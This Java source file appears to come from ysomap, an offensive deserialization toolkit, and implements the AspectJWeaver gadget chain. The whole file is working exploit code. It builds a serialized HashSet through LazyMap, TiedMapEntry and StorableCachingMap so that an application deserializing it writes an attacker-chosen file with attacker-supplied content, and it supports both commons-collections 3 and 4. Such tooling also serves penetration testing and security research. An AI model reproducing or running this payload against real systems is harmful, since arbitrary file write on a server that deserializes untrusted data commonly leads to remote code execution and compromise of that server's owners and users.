package ysomap.payloads.java.aspectjweaver;

import ysomap.bullets.Bullet;
import ysomap.bullets.aspectjweaver.StoreableCachingMapBullet;
import ysomap.common.annotation.*;
import ysomap.common.util.Logger;
import ysomap.core.util.FileHelper;
import ysomap.core.util.PayloadHelper;
import ysomap.core.util.ReflectionHelper;
import ysomap.payloads.AbstractPayload;

import java.io.FileNotFoundException;
import java.util.HashMap;
import java.util.Map;

/**
 * Gadget chain:
 * HashSet.readObject()
 *     HashMap.put()
 *         HashMap.hash()
 *             TiedMapEntry.hashCode()
 *                 TiedMapEntry.getValue()
 *                     LazyMap.get()
 *                         SimpleCache$StorableCachingMap.put()
 *                             SimpleCache$StorableCachingMap.writeToPath()
 *                                 FileOutputStream.write()
 *
 * https://medium.com/nightst0rm/t%C3%B4i-%C4%91%C3%A3-chi%E1%BA%BFm-quy%E1%BB%81n-%C4%91i%E1%BB%81u-khi%E1%BB%83n-c%E1%BB%A7a-r%E1%BA%A5t-nhi%E1%BB%81u-trang-web-nh%C6%B0-th%E1%BA%BF-n%C3%A0o-61efdf4a03f5
 * @author wh1t3p1g
 * @since 2021/7/30
 */
@Payloads
@SuppressWarnings({"rawtypes"})
@Authors({ Authors.JANG })
@Targets({Targets.JDK})
@Require(bullets = {"StoreableCachingMapBullet"},param = false)
@Dependencies({"org.aspectj:aspectjweaver:1.9.2", "commons-collections:commons-collections:all"})
public class AspectJWeaver extends AbstractPayload<Object> {

    private Class transformerClazz;
    private Class mapTransformerClazz;
    private Class lazyMapClazz;
    private Class entryClazz;

    @Override
    public Bullet getDefaultBullet(Object... args) throws Exception {
        return StoreableCachingMapBullet.newInstance(args);
    }

    @Override
    public Object pack(Object obj) throws Exception {
        try {
            initClazz(bullet.get("ccVersion"));
            byte[] content = FileHelper.fileGetContent(bullet.get("localFilepath"));
            String filename = bullet.get("filename");
            Map map = new HashMap();
            map.put(filename, content);
            Object transformer = ReflectionHelper.newInstance(mapTransformerClazz,
                            new Class[]{Map.class},
                            new Object[]{map});
            Map lazyMap = (Map) ReflectionHelper.newInstance(lazyMapClazz,
                            new Class[]{Map.class, transformerClazz},
                            obj, transformer
                    );

            Object entry = makeEntry(lazyMap, filename);

            return PayloadHelper.makeHashSetWithEntry(entry);
        }catch (FileNotFoundException e){
            Logger.error(e.getMessage());
        }

        return null;
    }

    public Object makeEntry(Map map, String filename) throws Exception {
        Object entry = ReflectionHelper.createWithoutConstructor(entryClazz);
        ReflectionHelper.setFieldValue(entry, "map", map);
        ReflectionHelper.setFieldValue(entry, "key", filename);
        return entry;
    }

    public void initClazz(String version) {
        try{
            if(version.equals("3")){
                transformerClazz = Class.forName("org.apache.commons.collections.Transformer");
                mapTransformerClazz = Class.forName("org.apache.commons.collections.functors.MapTransformer");
                lazyMapClazz = Class.forName("org.apache.commons.collections.map.LazyMap");
                entryClazz = Class.forName("org.apache.commons.collections.keyvalue.TiedMapEntry");
            }else{
                transformerClazz = Class.forName("org.apache.commons.collections4.Transformer");
                mapTransformerClazz = Class.forName("org.apache.commons.collections4.functors.MapTransformer");
                lazyMapClazz = Class.forName("org.apache.commons.collections4.map.LazyMap");
                entryClazz = Class.forName("org.apache.commons.collections4.keyvalue.TiedMapEntry");
            }
        }catch(ClassNotFoundException e){
            e.printStackTrace();
        }
    }
}
